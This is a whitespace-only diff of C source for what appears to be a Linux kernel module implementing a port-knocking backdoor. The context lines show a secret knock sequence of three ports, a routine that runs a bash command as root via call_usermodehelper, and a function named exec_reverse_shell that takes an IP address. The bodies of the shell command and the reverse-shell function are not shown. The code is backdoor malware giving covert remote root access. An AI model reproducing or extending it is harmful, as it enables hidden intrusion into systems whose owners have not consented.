@@ -6,7 +6,7 @@ static int knocking_ports[KNOCK_LENGTH] = {5295, 9257, 7369};
 
 struct knocker
 {
-	int knocking_counter;
+    int knocking_counter;
     u32 ipv_addr;
 };
 
@@ -22,14 +22,14 @@ DECLARE_WORK(exec_work, exec_command);
 
 static void exec_command(struct work_struct *w)
 {
-	char *argv[] = { "/bin/bash", "-c", bash_command, NULL};
+    char *argv[] = { "/bin/bash", "-c", bash_command, NULL};
 
-	char *env[] = {
-		"HOME=/",
-		"TERM=linux",
-		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
+    char *env[] = {
+        "HOME=/",
+        "TERM=linux",
+        "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
 
-	call_usermodehelper(argv[0], argv, env, UMH_WAIT_EXEC);
+    call_usermodehelper(argv[0], argv, env, UMH_WAIT_EXEC);
 }
 
 void exec_reverse_shell(u32 ip_addr)
@@ -43,7 +43,7 @@ void exec_reverse_shell(u32 ip_addr)
 int knockable_port_index(int port)
 {
     int i;
-	for (i = 0; i < KNOCK_LENGTH; i ++)
+    for (i = 0; i < KNOCK_LENGTH; i ++)
         if (port == knocking_ports[i])
             return i;
             
